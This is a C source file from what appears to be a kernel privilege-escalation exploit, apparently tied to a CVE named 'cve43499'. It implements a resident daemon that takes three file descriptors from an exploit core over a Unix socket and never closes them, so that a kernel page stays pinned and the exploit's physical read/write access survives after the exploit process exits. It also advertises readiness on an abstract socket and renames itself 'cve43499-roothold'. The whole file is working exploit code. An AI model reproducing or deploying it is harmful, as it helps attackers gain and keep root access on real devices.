#define _GNU_SOURCE

#include "su_daemon.h"

#include <stddef.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

/*
 * The kernel-page reference holder, which belongs to one exploit core.
 *
 * core66 reaches its physical read/write through a page it must keep the
 * kernel from reusing, and the exploit process cannot be the one holding it:
 * that process exits when the attempt ends. So core66/root.c hands the
 * descriptors to this daemon, which is already resident, and it simply never
 * closes them.
 *
 * core612 has no such page -- it swaps the exploit process's own cred and is
 * finished -- and never sends the opcode. Nothing here is reachable on that
 * core, which is why it is separated rather than sitting in the middle of the
 * daemon: the file says whose it is.
 *
 * Both sides of the contract are literals on either side of a socket, so they
 * are written out here in full:
 *
 *   'H'                   the opcode, sent before any request
 *   three descriptors     over SCM_RIGHTS, prefixed by the byte 'P'
 *   'K'                   the acknowledgement this sends back
 *   "cve43499_roothold"   the abstract socket the payload then polls to learn
 *                         that the holder is live (ROOT_HOLD_READY_SOCKET in
 *                         core66/root.c)
 */

#define HOLD_READY_SOCKET "cve43499_roothold"
#define HOLD_REF_FDS 3U

static int recv_hold_fds(int socket_fd, int fds[HOLD_REF_FDS]) {
  char marker = 0;
  struct iovec iov = {
      .iov_base = &marker,
      .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(int) * HOLD_REF_FDS)];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  memset(control, 0, sizeof(control));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = control;
  msg.msg_controllen = sizeof(control);

  if (recvmsg(socket_fd, &msg, MSG_CMSG_CLOEXEC) != (ssize_t)sizeof(marker) ||
      marker != 'P') {
    return 0;
  }
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS ||
      cmsg->cmsg_len != CMSG_LEN(sizeof(int) * HOLD_REF_FDS)) {
    return 0;
  }
  memcpy(fds, CMSG_DATA(cmsg), sizeof(int) * HOLD_REF_FDS);
  return 1;
}

void su_hold_kernel_references(int conn) {
  int fds[HOLD_REF_FDS] = {-1, -1, -1};
  if (!recv_hold_fds(conn, fds)) {
    return;
  }
  int ready_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (ready_fd < 0) {
    return;
  }
  struct sockaddr_un ready_address;
  memset(&ready_address, 0, sizeof(ready_address));
  ready_address.sun_family = AF_UNIX;
  memcpy(ready_address.sun_path + 1, HOLD_READY_SOCKET,
         sizeof(HOLD_READY_SOCKET) - 1);
  socklen_t ready_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) + sizeof(HOLD_READY_SOCKET));
  if (bind(ready_fd, (struct sockaddr *)&ready_address, ready_length) != 0 ||
      listen(ready_fd, 4) != 0) {
    close(ready_fd);
    return;
  }
  char acknowledged = 'K';
  if (!write_full(conn, &acknowledged, sizeof(acknowledged))) {
    return;
  }
  prctl(PR_SET_NAME, "cve43499-roothold", 0, 0, 0);
  close(conn);
  for (;;) {
    int probe_fd = accept4(ready_fd, NULL, NULL, SOCK_CLOEXEC);
    if (probe_fd >= 0) {
      close(probe_fd);
    }
  }
}
